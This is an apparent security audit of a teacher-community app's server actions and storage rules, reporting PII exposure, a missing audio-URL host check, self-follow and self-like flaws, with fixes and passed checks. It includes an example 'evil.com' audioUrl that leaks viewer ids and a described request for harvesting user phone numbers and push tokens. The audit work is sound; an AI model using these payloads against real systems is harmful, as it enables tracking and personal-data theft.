# F10 — Community + Social Forensic Audit

**Scope:** Feed correctness, group integrity, library/discovery, connection+chat.
**Method:** static code review of action handlers + Firestore/Storage rules.
**Files reviewed:**
- `src/app/actions/community.ts`
- `src/app/actions/groups.ts`
- `src/app/actions/connections.ts`
- `src/app/actions/profile.ts`
- `src/components/profile/profile-view.tsx`
- `storage.rules`
- `src/lib/db/adapter.ts`

---

## Findings

### F10-01 — P0 — PII leak: `getProfilesAction` returns full UserProfile to any signed-in user
**Where:** `src/app/actions/community.ts:14-17`
```ts
export async function getProfilesAction(uids: string[]) {
    await requireAuth();
    return await dbAdapter.getUsers(uids);
}
```
`dbAdapter.getUsers` returns the raw Firestore user docs verbatim (`adapter.ts:120-127`), which includes
`email`, `phoneNumber`, `fcmTokens`, `adminRoles`, billing/usage flags, onboarding state — none of
which are stripped. Compare with `getPublicProfileAction` (`profile.ts:53-96`) which carefully
whitelists fields and explicitly excludes `phoneNumber`, `fcmTokens`, `adminRoles`.

Any signed-in teacher can POST `{ uids: ["victim-uid-1", …, "victim-uid-10"] }` to the server-action
endpoint and harvest phone numbers + FCM tokens (FCM tokens enable spoofed push notifications) for
batches of 10 users at a time. With teacher directory listing IDs cheaply available (`getAllTeachersAction`),
the entire user table can be dumped 10 at a time.

**Severity:** P0 (PII leak via public profile pathway).
**Fix:** route through the same whitelist as `getPublicProfileAction`, or delete the action — currently it has zero in-app callers (`grep` shows only its own definition + an auth test). Until then it is dormant attack surface.
**Repro:** `qa/forensics/F10-repros/F10-01-getProfilesAction-pii.md`

---

### F10-02 — P0 — Public profile UI surfaces `email` to any signed-in viewer
**Where:** `src/components/profile/profile-view.tsx:245`
```tsx
<Mail className="h-4 w-4" /> {(isOwnProfile ? firebaseUser?.email : profile?.email) || t("Contact Hidden")}
```
`getPublicProfileAction` deliberately includes `email` in the public projection (`profile.ts:74`, with the
self-aware comment "public for connection (already shown elsewhere)"). The fallback string `"Contact Hidden"`
makes it clear the original design intent was contact-hiding for non-connections, but the gate is missing.

Effect: every teacher's email is harvestable by anyone who can sign up (the app does not gate sign-up by
school verification). Spam / phishing target list is one `/profile/[uid]` fetch away per teacher.

**Severity:** P0 (PII leak via public profile).
**Fix:** show email only when `connStatus === 'connected'` (the view already computes this — see
`profile-view.tsx:97-110`). Hide it on the server in `getPublicProfileAction` rather than the client —
include `email` in the projection only when the caller is a confirmed connection.
**Repro:** `qa/forensics/F10-repros/F10-02-profile-email-disclosure.md`

---

### F10-03 — P1 — `sendChatMessageAction` accepts arbitrary `audioUrl` host
**Where:** `src/app/actions/community.ts:768-803`
```ts
if (audioUrl) payload.audioUrl = audioUrl;  // no validation
```
Compare to the group-chat sibling `sendGroupChatMessageAction` (`groups.ts:616-618`) which DOES enforce:
```ts
if (audioUrl && !audioUrl.startsWith('https://firebasestorage.googleapis.com/')) {
    throw new Error('Invalid audio URL');
}
```
Community-chat path is missing this guard. Attackers can:
1. Set `audioUrl = "https://evil.com/track.mp3?victim={readerUid}"` — tracking pixel that fires when any
   community-chat viewer's `<audio>` element preloads metadata. Reveals which signed-in users opened the chat.
2. Point at a malformed audio that crashes the iOS Safari audio decoder.
3. Use it as an open redirect / data-exfil channel (`audioUrl` length is also uncapped — Firestore will
   reject >1 MiB but the server still spends CPU/bandwidth pre-write).

Also: `audioUrl` has no length cap, no protocol check, no MIME hint.

**Severity:** P1 (audio host bypass — playbook P1).
**Fix:** copy the group-chat validator: require `audioUrl.startsWith('https://firebasestorage.googleapis.com/')`,
add a 2 KiB length cap, and reject if `text.length > 500` (current cap is 500 but playbook expects 1000 — verify intent).
**Repro:** `qa/forensics/F10-repros/F10-03-community-chat-audio-host.md`

---

### F10-04 — P2 — `followTeacherAction` allows self-follow
**Where:** `src/app/actions/community.ts:139-177`
No `if (followerId === followingId) throw …` guard. A user can follow themselves, which:
- Inflates their own follower-count if `followersCount` is ever computed from `connections.followingId`
- Pollutes `getFollowingPosts` results (own posts appear in following feed)
- Sends themselves a `FOLLOW` notification (`createTypedNotification` at line 163 does not skip self)

**Severity:** P2 (cosmetic/feed-pollution).
**Fix:** add `if (followerId === followingId) throw new Error('Cannot follow yourself');` at top of action.

---

### F10-05 — P2 — `toggleLikeAction` allows self-like
**Where:** `src/app/actions/community.ts:83-111`
No self-like guard. `likeResourceAction` (`community.ts:529`) at least skips the notification on self-like
(`if (resData.authorId && resData.authorId !== userId)`) but still increments the counter. `toggleLikeAction`
for community posts doesn't even skip notifications, though it doesn't currently send one either.

**Severity:** P2 (count inflation).
**Fix:** decide policy — either reject self-like, or allow it but mark it server-side and exclude from public counts.

---

### F10-06 — P2 — `getGroupAction` returns full group doc to non-members
**Where:** `src/app/actions/groups.ts:309-315`
Calls only `requireAuth()`, not `requireGroupMember(groupId)`. Any signed-in user can read the full
group document including `autoJoinRules`, `memberCount`, `description`. This may be intentional
("Discover Groups" needs metadata before joining), and the post / chat / member subcollections ARE
properly gated. Flagged for confirmation against intended Wave 2 behavior.

**Severity:** P2 (metadata exposure; matches stated Wave 2 design).
**Fix:** none if intentional. Otherwise, gate behind `requireGroupMember`.

---

### F10-07 — INFO — text-length cap is 500 not 1000 in `sendChatMessageAction`
Playbook step 6 says `text len 1001` should reject (cap 1000). Actual cap is 500
(`community.ts:775`). 500 likely intentional (mobile-friendly); flagging only because the playbook
expectation diverges. Either update playbook or relax cap to 1000.

---

## Confirmations (no finding)

- **Connection request hijack (playbook step 9):** correctly blocked. `acceptConnectionRequestAction`
  enforces `req.toUid !== callerId` (`connections.ts:85`).
- **Self-connect (playbook step 10):** correctly blocked. `sendConnectionRequestAction` enforces
  `fromUid === toUid` (`connections.ts:25`).
- **Cross-tenant Storage write (playbook step 8):** correctly blocked. `storage.rules:19-26` enforces
  `request.auth.uid == userId` on `voice-messages/{userId}/{fileName}` and caps size + MIME.
- **`getRecommendedTeachersAction` impersonation (playbook step 3):** correctly blocked.
  `community.ts:407-415` derives `callerId` from session and throws `Forbidden` if a different `userId` is passed.
- **`getGroupPostsAction` non-member read (playbook step 5):** correctly blocked via
  `requireGroupMember(groupId)` (`groups.ts:418`).
- **Recommendation engine relevance (playbook step 2):** scoring logic correctly tiers by
  same-school (+30) > same-district (+15) > subject overlap (+20/subject) > grade overlap (+5/grade)
  > impact bonus (`community.ts:342-372`). Cache key per-uid prevents one teacher's recs leaking to another.

---

## Priority summary

| ID     | Sev | Area                | Issue                                                          |
|--------|-----|---------------------|----------------------------------------------------------------|
| F10-01 | P0  | Profile / PII       | `getProfilesAction` returns raw user doc incl. phone, FCM token |
| F10-02 | P0  | Profile / PII       | Public profile UI shows `email` to any signed-in viewer        |
| F10-03 | P1  | Community chat      | `sendChatMessageAction` has no `audioUrl` host validation      |
| F10-04 | P2  | Follow              | Self-follow allowed                                            |
| F10-05 | P2  | Like                | Self-like allowed                                              |
| F10-06 | P2  | Group metadata      | `getGroupAction` exposes group doc to non-members              |
| F10-07 | INFO| Chat                | text cap 500 vs playbook-expected 1000                         |
